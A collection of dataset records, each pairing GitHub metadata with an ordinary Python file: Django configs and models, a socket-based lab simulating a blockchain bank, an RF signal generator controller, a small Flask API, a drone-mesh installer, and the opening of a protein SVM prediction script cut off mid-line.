{"blob_id": "aa98b6ae07db4559de7d4a5201bcd12d2b9143d6", "directory_id": "761f849e5ed2490cbda6e2a0a7e710c8d9f255d8", "path": "/App/backend/amateurscore/amateurscore/wsgi.py", "content_id": "75d47655fa057e9158a3796400f2e65fbf21577d", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "megadisos/AmateurScore", "snapshot_id": "6926f4cc4a93cdfd5e8030a5081e18dfb2bb6f5b", "revision_id": "170666e488514319d212823243c03708a21651b1", "branch_name": "refs/heads/main", "visit_date": "2023-08-23 13:24:38.075574", "revision_date": "2021-10-27 03:38:56", "committer_date": "2021-10-27 03:38:56", "github_id": "None", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "401", "extension": "py", "content": "\"\"\"\nWSGI config for amateurscore project.\n\nIt exposes the WSGI callable as a module-level variable named ``application``.\n\nFor more information on this file, see\nhttps://docs.djangoproject.com/en/3.2/howto/deployment/wsgi/\n\"\"\"\n\nimport os\n\nfrom django.core.wsgi import get_wsgi_application\n\nos.environ.setdefault('DJANGO_SETTINGS_MODULE', 'amateurscore.settings')\n\napplication = get_wsgi_application()\n"}
{"blob_id": "493612c00b9ac1931d9417982a911cbe680760b1", "directory_id": "3f378d5483c97a750d9f8585ec8c8ff70fe8ba20", "path": "/new_lab2/p2.py", "content_id": "a02ab31c35fb7e7499a640a049c725c55977be35", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "busycsu/distributed_system_practice", "snapshot_id": "7c39f58d79d9df718362a35cc367b07f5a89a75e", "revision_id": "c6b260806590b7b8e46c01c5c3e1d7b6510cb42b", "branch_name": "refs/heads/master", "visit_date": "2022-06-03 16:56:44.490925", "revision_date": "2020-05-05 20:50:57", "committer_date": "2020-05-05 20:50:57", "github_id": "258957784", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "5012", "extension": "py", "content": "\nimport threading \nimport time\nimport queue\nimport socket\nfrom queue import PriorityQueue\n#  do we care if i before i receive i send a new message to network process\ndef sortFifth(val):\n\treturn val[4]\n\n\nclass Node: \n   \n    # Function to initialize the node object \n    def __init__(self, data): \n        self.data = data  # Assign data \n        self.next = None  # Initialize  \n                          # next as null \n   \n# Linked List class \nclass LinkedList: \n     \n    # Function to initialize the Linked  \n    # List object \n    def __init__(self):  \n        self.head = None\n\n\n\n\n\nIP = \"127.0.0.1\"\nPORT = 5000\nP = 5002\naddr = (IP, PORT)\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\nclklist = []\nlock = True\nhelper = []\nblockchain = []\nevent = []\nbalance = 10\nclk = 0\ncount = 0\nbroad = False\nq = queue.Queue(10)\ntmp = queue.Queue(10)\npq = PriorityQueue()\n\n\n# This is processing thread or consumer thread, deal with local queue\nclass cThread (threading.Thread):\n\tdef __init__ (self, threadID, name, counter):\n\t\tthreading.Thread.__init__(self)\n\t\tself.threadID = threadID\n\t\tself.name = name\n\t\tself.counter = counter\n\n\tdef run(self):\n\t\tglobal clk\n\t\tglobal balance\n\t\tglobal count\n\t\tglobal broad\n\t\tglobal q\n\t\tglobal tmp\n\t\tglobal pq \n\t\tglobal lock\n\n\t\twhile True:\n\t\t\t# socket set up\n\t\t\t\n\t\t\t# clk set up\n\t\t\tif pq.empty():\t\n\t\t\t\tpass\n\t\t\tif not pq.empty():\n\t\t\t\ttime.sleep(3)\n\t\t\t\tprint(\"stop waiting\")\n\t\t\t\ta = pq.get()\n\t\t\t\tprint(a)\n\t\t\t\tif a[1] == 2:\t#change accordingly\n\t\t\t\t\tprint(\"~~~~~~~\",lock)\n\t\t\t\t\twhile lock:\n\t\t\t\t\t\tprint(\"in lock\")\n\t\t\t\t\t\ttime.sleep(3)\n\t\t\t\t\t\t# break\n\t\t\t\t\tbalance = balance - a[3]\n\t\t\t\t\tlock = True\n\n\t\t\t\t\tmsgtype = 2\n\t\t\t\t\tamt = a[3]\n\t\t\t\t\tdest = a[2]\n\n\t\t\t\t\t# send release\n\t\t\t\t\tc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\t\t\t\t\tc.connect(addr)\n\t\t\t\t\tclk = clk +1\n\t\t\t\t\tclklist.append((\"send release\",clk))\n\t\t\t\t\tdata = str(msgtype)+\"/\"+str(amt)+\"/\"+str(dest)+\"/\"+str(2)+\"/\"+str(clk) #change accordingly\n\t\t\t\t\tc.sendall(data.encode('utf-8'))\n\t\t\t\t\tc.close()\n\n\t\t\t\telse:\n\t\t\t\t\t# send reply\n\t\t\t\t\tc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\t\t\t\t\tc.connect(addr)\n\t\t\t\t\tclk = clk +1\n\t\t\t\t\tclklist.append((\"send reply\",clk))\n\t\t\t\t\tmsgtype = 1\n\t\t\t\t\tamt = a[3]\n\t\t\t\t\tdest = a[2]\n\t\t\t\t\tsid = a[1]\n\n\t\t\t\t\tdata = str(msgtype)+\"/\"+str(amt)+\"/\"+str(dest)+\"/\"+str(sid)+\"/\"+str(clk) #change accordingly\n\t\t\t\t\tprint(data)\n\t\t\t\t\tc.sendall(data.encode('utf-8'))\n\t\t\t\t\tc.close()\n\t\t\t\t\tprint(\"finish send\")\n\n\t\t\t\tele1 = 'P'+str(a[1])\n\t\t\t\tele2 = 'P'+str(a[2])\n\t\t\t\tele3 = '$'+str(a[3])\n\t\t\t\tblockchain.append((ele1,ele2,ele3))\n\t\t\t\t\n\n\nclass pThread (threading.Thread):\n\tdef __init__ (self, threadID, name, counter):\n\t\tthreading.Thread.__init__(self)\n\t\tself.threadID = threadID\n\t\tself.name = name\n\t\tself.counter = counter\n\n\tdef run(self):\n\t\tglobal clk\n\t\tglobal balance\n\t\tglobal count\n\t\tglobal broad\n\t\tglobal q\n\t\tglobal lock\n\t\ts.bind((IP, P))\n\t\ts.listen(1)\n\t\ti = 0\n\t\twhile True:\n\n\t\t\t# print(\"wait for message\")\n\t\t\tstream, addr = s.accept()\n\t\t\t# print(\"socket created, wait for incoming message\")\n\t\t\tmessage = stream.recv(1024).decode('utf-8')\n\t\t\t\n\n\t\t\t# decode msg\n\t\t\tmsg = message.split(\"/\")\n\t\t\t\n\t\t\t# data = ((\"receive\",\"'\"+msg[0]+\"'\",0,int(msg[1])))\n\t\t\t# when receive request\n\t\t\tif msg[0]=='0':\n\n\t\t\t\tclk = max(int(msg[4]), clk) + 1\n\t\t\t\tclklist.append((\"recv request\",clk))\n\t\t\t\tc = int(msg[4])\n\t\t\t\tpid = int(msg[3])\n\t\t\t\tdest = int(msg[2])\n\t\t\t\tmon = int(msg[1])\n\t\t\t\t# event = [\"reply\", 1, int(msg[1]), int(msg[2]), int(msg[3]), int(msg[4])]\n\n\t\t\t\tpq.put((c,pid, dest, mon, 1))\n\t\t\t# when receive reply\n\t\t\t# when should the balanced be changed\n\t\t\telif msg[0] == '1':\n\t\t\t\ti = i + 1\n\n\t\t\t\tprint(\"********\",lock,i)\n\t\t\t\tif i == 2:\n\t\t\t\t\tlock = False\n\t\t\t\t\ti=0\n\t\t\t\tclk = max(clk,int(msg[4])) + 1\n\t\t\t\tclklist.append((\"recv reply\",clk))\n\t\t\telif msg[0] == '2':\n\t\t\t\tclk = max(clk,int(msg[4])) + 1\n\t\t\t\tclklist.append((\"recv release\",clk))\n\t\t\t\tprint(\"recv release\")\n\t\t\t\tif msg[2]=='2':\n\t\t\t\t\tprint(\"recv money\")\n\t\t\t\t\tbalance = balance+int(msg[1])\n\t\t\t\n\n\n\nthreadLock = threading.Lock()\nthreads = []\n\nthread1 = cThread(1, \"Thread-1\", 1)\nthread2 = pThread(2, \"Thread-2\", 2)\n\nthread1.start()\nthread2.start()\n\nthreads.append(thread1)\nthreads.append(thread2)\n\n\n# for t in threads:\n# \tt.join()\nwhile True:\n\tx = int(input(\"\\nInput 1 to transfer or 2 to print blockchain or 3 to print balance \\n\"))\n\t\n\t# Add local event\n\tif x == 1:\n\t\t# this send the request\n\t\tprocess = input(\"Add receiver id: \")\n\t\tid = int(process)\n\t\tamt = int(input(\"Send amt: \"))\n\n\t\t# balance = balance - amt\n\n\t\tif amt<= balance:\n\n\t\t\tclk = clk + 1\n\t\t\tclklist.append((\"trans\",clk))\n\t\t\te = ((\"send\", 0, amt, id, 2, clk)) # change accordingly\n\t\t\t\n\t\t\tc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\t\t\tc.connect(addr)\n\t\t\tclk = clk +1\n\t\t\tclklist.append((\"send\",clk))\n\t\t\tdata = str(e[1])+\"/\"+str(e[2])+\"/\"+str(e[3])+\"/\"+str(e[4])+\"/\"+str(clk)\n\t\t\tc.sendall(data.encode('utf-8'))\n\t\t\tc.close()\n\t\t\t\n\t\t\tpq.put((clk,2,id,amt,0))\n\t\telse:\n\t\t\tclk = clk + 1\n\t\t\tprint(\"Failure\")\n\telif x == 2:\n\t\tprint(blockchain)\n\t\t\n\n\n\telif x == 3:\n\t\tprint('$', str(balance))\n\n\telse:\n\t\tprint(clklist)\n\n\n\n\n"}
{"blob_id": "a6ea40d50f262c16503ae8f747523393b7784a49", "directory_id": "0c6db4fa05ef5411051ec4dcf9cd9437ec03faab", "path": "/main_code/transmit_loop_power.py", "content_id": "ebb2bf86901bfb0ad500faff66ed64bf4309ff5e", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "sgeverpo/ara-spicecore", "snapshot_id": "4fb25103ead4f2c2c952cb39f814107744b56190", "revision_id": "6795be1ad2094e166fa2f80c013562165f106f57", "branch_name": "refs/heads/master", "visit_date": "2021-01-15 12:02:02.260379", "revision_date": "2017-08-17 16:33:41", "committer_date": "2017-08-17 16:33:41", "github_id": "99640458", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "4728", "extension": "py", "content": "#############################################\n#This code generates a series of pulses using the Windfreak SynthNV RF signal generator.\n#The format is as follows: Send \"amount_pulse\" of pulses of frequency 1 with a waiting time \"period\" between them.\n#Wait for a time interval \"pause\" before going to the next frequency. Repeat for all frequencies given in \"frequencies\".\n#\"frequencies\", \"amount_pulse\", \"period\" and \"pause\" are read from an input file as specified by the initialize(filename) function.\n#\n#This version also sends a longer burst for each new frequency to make a power measurement.\n#############################################\n\n\nimport time\nimport serial\nimport thread\n\ndef initialize(filename):\n    '''Read input from a file given as argument. The file should have the frequencies at which to send pulses in MHz at its first (not comment) line, separated by spaces. The second line has the amount of pulses to send at each frequency. The third line has the time between pulses in milliseconds. The fourth line has the pause between sending pulses of certain frequencies in ms.'''\n    f = open(filename,'r')\n    \n    i = 0\n    for line in f:\n        if line[0] != \"#\":\n            if i == 0:\n                frequencies = [freq.strip() for freq in line.split(\" \")]\n            if i == 1:\n                amount_pulse = int(line.strip())\n            if i == 2:\n                period = float(line.strip())*0.001\n            if i == 3:\n                pause = float(line.strip())*0.001\n            i += 1\n            \n    return frequencies, amount_pulse, period, pause\n\ndef writeToSynth(message,serial):\n    '''Write commands to the Windfreak SynthNV RF signal generator through the serial port. The C0 writes to channel 0 of the SynthNV.'''\n    serial.write(\"C0\"+message)\n\ndef readSynth(serial):\n    '''Read output from the signal generator through the serial port. As long as there is stuff in the buffer, read it out byte by byte.'''\n    while serial.inWaiting() > 0:\n        serial.read(1)\n\ndef sendPulse(serial):\n    '''Give the command to the signal generator to send one pulse.'''\n    writeToSynth(\"G\", serial)\n    \ndef main_loop(frequencies,amount_pulse,period,pause,serial):\n    '''Execute the transmission of the pulses. This function will send the given amount of pulses at each frequency with the specified interval between them and with the given pause between series of pulses at different frequencies. To clear the generator's output from the buffer, it is read out in a thread running during the waiting time between pulses.'''\n    print \"Start\"\n    power_results = []\n    for freq in frequencies:\n        writeToSynth(\"f\"+freq,serial)\n        \n        #send continuous pulse to read back power\n        writeToSynth('a2',serial)\n        currentTime = time.time()\n        sendTime = 0.001 #how long to send continuous pulse (in s)\n        while time.time() <=  currentTime + sendTime:\n            writeToSynth('w',serial)\n        writeToSynth('G',serial)    \n            \n        currentTime = time.time()\n        out = ''\n        while time.time() < currentTime + period:\n            if serial.inWaiting() > 0:\n                while serial.inWaiting() > 0:\n                    out += serial.read(1)\n        power_results.append(out)\n\n\n        #send the normal pulses\n        for i in range(amount_pulse):\n            sendPulse(serial)\n            #try:\n            #    thread.start_new_thread(readSynth, (serial, ))\n            #except:\n            #    print \"Error: could not start read-thread.\"\n            time.sleep(period)\n\n            #using a while loop and the time function seems to give more accurate waiting times\n            #currentTime = time.time()\n            #while time.time() < currentTime + period:\n            #    pass            \n\n        time.sleep(pause)\n    print \"Finished.\"\n    return power_results\n#def stop(ser):\n#    while 1:\n#        input = raw_input(\"Type 'exit' to stop: \")\n#        if(input == \"exit\"):\n#            ser.close()\n#            thread.interrupt_main()\n#            exit()\n        \n#Execution of the functions that making up the code.\n#Initialize the program from input.txt.\nfrequencies, amount_pulse, period, pause = initialize(\"input.txt\")\n\n#Open the serial port where the Windfreak SynthNV signal generator is connected. \nser = serial.Serial('/dev/ttyACM0', 9600)\n\n#Run the main part of the code.\n#try:\n#    thread.start_new_thread(stop, (ser, ))\n#except:\n#    print \"Error: could not start close-thread.\"\npower_results = main_loop(frequencies,amount_pulse,period,pause,ser)\n\n#When finished, close the serial port.\nser.close()\n\noutfile = open(\"output_a2.txt\",'w')\nfor item in power_results:\n    outfile.write(str(item) + '\\n')\noutfile.close()\n\n"}
{"blob_id": "206a63739a1b10b82f795a2993242a2879635310", "directory_id": "89fe7ab88acb82b9bed1718c67570346255c4580", "path": "/tournament/models.py", "content_id": "b3f755be9478d62e69b057c056cc66cc91ed5cb4", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "bunny232/wakegolftourfinal", "snapshot_id": "aa0597a7fb80650e7771b1e1dd6c7d46a3ab0b6e", "revision_id": "1881a8ddff43a3b6552d5544e4d756e9e9a39de9", "branch_name": "refs/heads/main", "visit_date": "2023-04-27 01:03:46.190787", "revision_date": "2021-05-07 10:35:09", "committer_date": "2021-05-07 10:35:09", "github_id": "363582945", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "1321", "extension": "py", "content": "# This is an auto-generated Django model module.\n# You'll have to do the following manually to clean this up:\n#   * Rearrange models' order\n#   * Make sure each model has one field with primary_key=True\n#   * Make sure each ForeignKey and OneToOneField has `on_delete` set to the desired behavior\n#   * Remove `managed = False` lines if you wish to allow Django to create, modify, and delete the table\n# Feel free to rename the models, but don't rename db_table values or field names.\nfrom django.db import models\nfrom golf_course.models import GolfCourse\n\n\nclass Tournament(models.Model):\n    tourn_id = models.AutoField(primary_key=True)\n    tourn_name = models.TextField()\n    tourn_course = models.ForeignKey(GolfCourse, models.DO_NOTHING)\n    tourn_start_date = models.DateField()\n    tourn_num_rounds = models.IntegerField()\n    tourn_num_golfers = models.IntegerField()\n\n    class Meta:\n        managed = False\n        db_table = 'Tournament'\n\n    def __str__(self):\n        return self.tourn_name\n\n\nclass Round(models.Model):\n    round_id = models.AutoField(primary_key=True)\n    round_tourn = models.ForeignKey(Tournament, models.DO_NOTHING)\n    round_day = models.TextField()\n\n    class Meta:\n        managed = False\n        db_table = 'Round'\n\n    def __str__(self):\n        return \"{}\".format(self.round_day)\n"}
{"blob_id": "04216125b5870f8f36397dafd476dc8a265f1347", "directory_id": "db8765010058e4551cae3f2ed7fc53c0f8194823", "path": "/flask_app.py", "content_id": "eed3cbf9c0b2dcdcf616fa1cd844e6249540a2b2", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "taeminlee/python_ml_webservice", "snapshot_id": "1f18576c75a3a8ce3515683ad4aa288cb00e475d", "revision_id": "8e32dfcbd95d09b3d7a6a49dd02a4ebc42216be5", "branch_name": "refs/heads/main", "visit_date": "2023-06-28 06:55:03.917418", "revision_date": "2021-07-21 06:18:49", "committer_date": "2021-07-21 06:18:49", "github_id": "388012715", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "920", "extension": "py", "content": "# 3rd-party\nfrom flask import Flask\nfrom flask_cors import CORS\n\nimport werkzeug\nwerkzeug.cached_property = werkzeug.utils.cached_property\n\nfrom flask_restplus import Api, Resource, reqparse\n\n# Flask App \uc0dd\uc131\napp = Flask('app name')\napp.config['DEBUG'] = True\napp.config['SWAGGER_UI_DOC_EXPANSION'] = 'list'\n\n# CORS \uc124\uc815\nCORS(app)\n\n# Flask-rest Api \uc0dd\uc131\napi = Api(app, version='1.0', title='app \uc81c\ubaa9', description='app \uc124\uba85')\n\nmodel = lambda x: x[::-1]  # \ubaa8\ub378 \ucd08\uae30\ud654\n\nargs_parser = reqparse.RequestParser()\nargs_parser.add_argument('query', location='form', type=str, default=\"\", help='\uc9c8\uc758\ubb38. \ud55c \ubb38\uc7a5\uc73c\ub85c \uc785\ub825\ud574\uc8fc\uc138\uc694.')\n\n@api.route('/forward')\n@api.doc(parser=args_parser)\nclass ServeModel(Resource):\n    def post(self):\n        args = args_parser.parse_args()\n        query = args['query']\n        return model(query)\n\nif __name__ == '__main__':\n    app.run(port='41069', host='0.0.0.0')"}
{"blob_id": "6b2a23d6d1863d32183f75be6f4a0139f2c38f50", "directory_id": "54146200252ad3b4115b51f8df03245429717edc", "path": "/install.py", "content_id": "a5ad2fd889dcaa034d96e3add254d04e7b0953c8", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "ORoyalRIDEr/DroneMesh", "snapshot_id": "d04250de22795a1129ee37d57af23ce5b2e5639d", "revision_id": "2156aea8864800876ef4cef08bb007ef3f26eb41", "branch_name": "refs/heads/master", "visit_date": "2020-03-19 00:42:32.119909", "revision_date": "2018-07-07 11:30:02", "committer_date": "2018-07-07 11:30:02", "github_id": "135497674", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "3533", "extension": "py", "content": "#!/usr/bin/python3\n\nimport os, sys\n\n##variables\n\n#error messages\n#invalid input\ninvInpMsg = \"Ungueltige Eingabe\\n\"\n\n#module to be installed\nmoduls = {1:\"Kontrollstation\", 2:\"Drohne\", 3:\"Repeater\"}\nmodule = \"none\"\n\n#autorun on or off\nautorun = False\n\n#path for installation\npathname = \"/opt\"\n\n##check directory, must be *pathname*\npath = os.path.dirname(os.path.abspath(sys.argv[0]))\nif (path != \"%s/droneMesh\"%pathname):\n\twhile True:\n\t\t#get user input\n\t\tprint(\"Sie befinden sich nicht im Ordner '%s/droneMesh'. Sollen alle Dateien dorthin verschoben werden? (j/n)\"%pathname)\n\t\tinp = input()\n\t\tif(inp == 'j'): \n\t\t\tprint(\"Dateien werden verschoben...\")\n\t\t\tos.system(\"sudo cp -r ../droneMesh %s\"%pathname)\n\t\t\tbreak\n\t\telif(inp == 'n'): \n\t\t\tprint(\"Verschieben sie die Dateien bitte manuell und starten sie die Installation neu.\")\n\t\t\tsys.exit()\n\t\t\tbreak\n\t\tprint(invInpMsg)\n\t\t\n#configuration file\nconf = open(\"%s/droneMesh/configs/conf.dat\"%pathname,\"w\")\n\n\n##choose module\nwhile True:\n\t#get user input\n\tprint(\"Waehlen sie das zu installierende Modul:\\n1: %s\\n2: %s\\n3: %s\"%(moduls[1],moduls[2],moduls[3]))\n\tinp = input()\n\t#parse uer input\n\ttry: module  = int(inp)\n\texcept ValueError:\n\t\tprint(invInpMsg)\n\t\tcontinue\n\t\t\n\t#check if user input is valid\n\tif(not((module-1) in range(3))):\n\t\tprint(invInpMsg)\n\t\tcontinue\n\telse: break\nprint(\"%s wurde ausgewaehlt\"%moduls[module])\t\n\n\n##choose autorun\nwhile True:\n\t#get user input\n\tprint(\"Soll das Modul im Autostart geladen werden? (j/n)\")\n\tinp = input()\n\tif(inp == 'j'): \n\t\tautorun = True\n\t\tbreak\n\telif(inp == 'n'): \n\t\tautorun = False\n\t\tbreak\n\tprint(invInpMsg)\n\t\n#write config file\nconf.write(\"module:%i\\nautorun:%i\"%(module, int(autorun)))\n\n#set \"autorun.py\" to autostart via /etc/rc.local\ninsertLine = \"%s/droneMesh/autorun.py &\\n\"%pathname\nf = open(\"/etc/rc.local\", \"r\")\ncont = f.readlines()\nf.close()\n#check if entry already exists\nentryFound = 0\nfor line in cont:\n\tif (line == insertLine):\n\t\tentryFound = 1\n\t\tbreak\n#if not found, insert entry\nif (entryFound == 0):\n\tnewFileCont = []\n\tentryWritten = 0\n\tfor line in cont:\n\t\t#skip comment lines\n\t\tif (not(entryWritten) and (line[0] != \"#\")):\n\t\t\tnewFileCont.append(insertLine)\n\t\t\tentryWritten = 1\n\t\t\t\n\t\tnewFileCont.append(line)\n\t#write to file\n\tf = open(\"/etc/rc.local\", \"w\")\n\tnewFileCont = \"\".join(newFileCont)\n\tf.write(newFileCont)\n\tf.close()\n\t \n\n#install batctl for controlling batman\nos.system(\"sudo apt-get install batctl\")\n\n##run module dependent processes\n\n#install isc-dhcpd and vlc if module is control station\nif(module == 1):\n\t#install DHCP-Server\n\tprint(\"\\nInstall DHCP-Server...\")\n\tos.system(\"sudo apt-get install isc-dhcp-server\")\n\t#copy configuration files for DHCP-Server\n\tprint(\"\\nCopy Configuration Files...\")\n\tos.system(\"sudo cp configs/dhcpd.conf /etc/dhcp/\")\n\tos.system(\"sudo cp configs/isc-dhcp-server /etc/default/\")\n\t\n\t#install vlc\n\tprint(\"\\nInstall VLC-Media-Player...\")\n\tos.system(\"sudo apt-get install vlc\")\n\t\n#install vlc if module is drone\nelif(module == 2):\n\t#install vlc\n\tprint(\"\\nInstall VLC-Media-Player...\")\n\tos.system(\"sudo apt-get install vlc\")\n\t#copy configuration files for DHCP-Server\n\tprint(\"\\nCopy Configuration Files...\")\n\t#os.system(\"sudo cp configs/vlcrc /home/pi/.config/vlc/\") #not working, because vlc-direction doesn't exist\n\t\n\t\n#create ignoredInterfaces-file if doesn't exist:\ntry: \n\tf = open(\"ignoredInterfaces\", \"r\")\n\tf.close()\nexcept FileNotFoundError:\n\tf = open(\"ignoredInterfaces\", \"w\")\n\tf.write(\"#The following network interface hw-adresses will be ignored when running the module\")\n\tf.close()\n"}
{"blob_id": "063279055ac37e8250c4ee63d7d8eea4f1cca3c2", "directory_id": "5bad6848a9c4200d11eed9fd488d11738e042f38", "path": "/src/boctopus_predictsvm.py", "content_id": "44abf71a6f39a14f740db0a8ca0c21d4d3930c64", "detected_licenses": "['MIT']", "license_type": "permissive", "repo_name": "ElofssonLab/boctopus2", "snapshot_id": "c7cf4ecb444e32b87112cf39971bd923dd5de395", "revision_id": "0a3c58a28be37a6febb102cb995c3e5459d948ec", "branch_name": "refs/heads/master", "visit_date": "2020-05-20 22:39:44.371488", "revision_date": "2019-11-14 11:48:58", "committer_date": "2019-11-14 11:48:58", "github_id": "185786347", "star_events_count": "1", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "10713", "extension": "py", "content": "## standard leave one out on the selected parameters.\n\nimport os, sys, string, random\nimport boctopus_writepred2prf\n\nrundir = os.path.realpath(os.path.dirname(__file__))\n\n\n\nthreshold = 0.3\n\n\ndef write_Rscript():#{{{\n\treturn#}}}\n\n\ndef write_profilefile(pName, iData, oData, inloopData, outloopData, fastaSeq, start, end, Home, svmoutPath, tmpHome):#{{{\n        svmfile = pName + \"_ioIOS.prf.txt\"\n\n        #print fastaSeq\n        f = open(svmoutPath+svmfile, \"w\")\n        f.write(\"Sequence: \" + pName +\".fa\" + \"\\n\")\n        f.write(\"NR of aligned sequences: 100\" + \"\\n\")\n        f.write(\"Length of query sequence: \" + str(len(fastaSeq)) + \"\\n\")\n        f.write(\"\\n\\n\")\n        f.write(\"START 1\" + \"\\n\")\n        f.write(\"ALPHABET:\\t\")\n\n        f.write(str(iData[0])+\"\\t\"+ str(oData[0])+\"\\t\" + str(inloopData[0])+\"\\t\"+str(outloopData[0])+\"\\tS\\t\")\n        f.write(\"-\\t<SPACE>\\t<LABEL>\\t<QUERY>\\n\")\n\n        for i in range(1, len(iData)):\n                f.write(\"COL\\t\" + str(i) + \":\\t\")\n                if i >= start and i <= end:\n                        f.write(str(iData[i]) +\"\\t\"+ str(oData[i])+\"\\t\"+ str(inloopData[i]) +\"\\t\"+ str(outloopData[i])+\"\\t0.0\")\n                else:\n                        f.write(str(0.00) +\"\\t\"+ str(0.00)+\"\\t\"+ str(1.0) +\"\\t\"+ str(0.0)+\"\\t0.0\")\n                f.write(\"\\t0.00\\t0.00\\t.\\t\" + fastaSeq[i-1]+\"\\n\")\n\n        f.write(\"END 1\")\n        f.close()\n\n        return\n#}}}\n\ndef getrunning_average(pname, data1, data2, pflag):\n        mydata = []\n        for i in range(1, len(data1)):\n                mydata.append(float(data1[i]) + float(data2[i]))\n\n        ws = 100\n\n        x = []\n        y = []\n\n        for i in range(0, len(mydata)):\n                start = i- ws/2\n                end   = i + ws/2\n\n                if start < 0:\n                        start = 0\n\n                if end > len(mydata):\n                        end = len(mydata)\n\n                if len(mydata[start:i]) > 0:\n                        avg1 = sum(mydata[start:i])/len(mydata[start:i])\n                else:\n                        avg1 = 0.0\n\n                if len(mydata[i:end]) > 0:\n                        avg2 = sum(mydata[i:end])/len(mydata[i:end])\n                else:\n                        avg2 = 0.0\n\n                if pflag:\n                        print start, i, end,  avg1+avg2\n\n                x.append(i)\n                y.append(avg1+avg2)\n\n        return x, y\n\n\ndef find_barrelregio(avgx, avgy):\n        flag = 0\n        start= 0\n        startflag = 0\n        end  = len(avgx)\n\n        for i in range(0, len(avgx)):\n                #print avgx[i], avgy[i]\n                if avgy[i] > threshold and startflag == 0:\n                        startflag  = 1\n                        start = i\n                if avgy[i] > threshold:\n                        flag = 1\n                if flag and avgy[i] < threshold:\n                        end = i\n                        #print \"end\", end\n                        flag = 0\n                if flag and avgy[i] > threshold:\n                        end = len(avgx)\n                        #print \"**\", flag\n\n        return start, end\n\n\ndef readprfFiles(filename, pDict, pidcid):\n\tf    = open(filename, \"r\")\n        data = f.readlines()\n        f.close()\n        \n\tstart = 0\n\n\tlabels   = []\n\tprofiles = []\n\n        for prefs in data:\n\t        prefs = prefs.strip()\n\t\tprefs = string.split(prefs)\n                \n\t\tif len(prefs) == 0:\n\t\t\tcontinue\n\n\t\tif prefs[0] == \"ALPHABET:\":\n\t                start = 1\n\t\t\tfor label in prefs[1:-3]:\n\t\t\t\tlabels.append(label)\n\n\t\tif start == 1:\n\t\t\tif prefs[0] == \"COL\":\n\t\t\t\t#print pidcid, prefs, prefs[2:-3], prefs[-1]\n\t\t\t\tprofiles = prefs[2:-3]\n\t\t\t\tprofiles.append(prefs[-1])\n\t\t\t\tpDict[pidcid].append(profiles)\n    \n\treturn labels\n\n\ndef get_labeledTestFiles(testX, windowSize, testfilename, Home, svmoutPath, tmpHome):#{{{\n\twindowSize = int(windowSize)\n\tfactor     = 10.0\n\n        print \"Remember how you are dividing the trainX parameter\", factor, \"windowSize\", windowSize\n\n        f = open(tmpHome + testfilename, \"w\")\n        for i in range(0,len(testX)):\n                for j1 in range(1, windowSize+1):\n                        zero, one, flagNA = 0, 0, 0\n                        for j2 in range(20*(j1-1)+0,20*(j1-1)+20):\n                                if testX[i][j2] != \"NA\":\n                                        f.write(str(float(testX[i][j2])/factor)+\" \")\n                                else:\n                                        f.write(\"0 \")\n                                        flagNA  = 1\n                f.write(\"\\n\")\n\n        f.close()\n\n\treturn\n#}}}\n\ndef actualPred(proteinDict, ws_cytosolic, ws_extracellular, ws_lipidfacing, ws_porefacing, outHome, prefix, seq, Home, svmoutPath, tmpHome):#{{{\n\tproteins = proteinDict.keys()\n\n\tpDict_in = {}\n\tpDict_ot = {}\n\tpDict_top= {}\n\tpDict_inloop = {}\n\tpDict_otloop = {}\n\n\tfor i in range(0, len(proteins)):\n\t\tpTest = proteins[i]\n\n                testProtein = []\n                testProtein.append(pTest)\n\n\t\tprint \"SVM-stage\", testProtein\n\n\t\ttestX  = []\n\n\t\tfor protein in testProtein:\n\t\t\tfor data in proteinDict[protein]:\n\t\t\t\ttestX.append(data[1:])\n\t\t\tif len(proteinDict[protein]) == len(testX):\n\t\t\t\tprint \"Running SVMs for\", protein, len(proteinDict[protein]), len(testX)\n\t\t\telse:\n\t\t\t\tprint \"boctopus_predict length error \", protein, len(proteinDict[protein]), len(testX)\n\t\t\t\tsys.exit()\n\t\t\n\t\tpDict_in[pTest] = []\n\t    \tpDict_ot[pTest] = []\n    \t\tpDict_otloop[pTest] = []\n    \t\tpDict_inloop[pTest] = []\n\n\t\t#print protein, pTest\n\n                testfilename = pTest + \"_cyto.dat\"\n               \tget_labeledTestFiles(testX, ws_cytosolic, testfilename, Home, svmoutPath, tmpHome)\n               \t#os.system(\"cp \" + tmpHome + testfilename + \" \" + tmpHome + \"test.dat\")\n               \toutputPred = pTest + \"_\" + str(ws_cytosolic) + \"_cytoloop_svmradialResult.txt\"\n               \trcommand1 = prefix + \"R --vanilla --slave < \" + 